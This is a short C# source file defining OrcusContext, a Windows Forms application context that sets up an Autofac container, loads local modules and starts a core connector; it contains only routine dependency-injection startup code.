using System.Windows.Forms;
using Autofac;
using NuGet.Frameworks;
using NuGet.Versioning;
using Orcus.Core;
using Orcus.Core.Connection;
using Orcus.Core.Modules;

namespace Orcus
{
    public class OrcusContext : ApplicationContext, IApplicationInfo
    {
        public OrcusContext(ContainerBuilder builder)
        {
            builder.RegisterInstance(this).AsImplementedInterfaces();
            RootContainer = builder.Build();

            Container = LoadModules();
            StartConnecting();
        }

        /// <summary>
        ///     The root container that contains all services of Orcus
        /// </summary>
        private IContainer RootContainer { get; }

        /// <summary>
        ///     The core container, which inherits from <see cref="RootContainer" /> but also provides services from local modules
        /// </summary>
        public ILifetimeScope Container { get; }

        public NuGetFramework Framework { get; } = FrameworkConstants.CommonFrameworks.OrcusClient10;
        public NuGetVersion Version { get; } = NuGetVersion.Parse("1.0");

        private ILifetimeScope LoadModules()
        {
            var loader = RootContainer.Resolve<ILocalModuleLoader>();
            var packagesLoaded = false;

            var modulesScope = RootContainer.BeginLifetimeScope(builder => packagesLoaded = loader.Load(builder));

            if (!packagesLoaded)
            {
                modulesScope.Dispose();
                return RootContainer;
            }

            return modulesScope;
        }

        private void StartConnecting()
        {
            Container.Resolve<ICoreConnector>().StartConnecting(Container);
        }
    }
}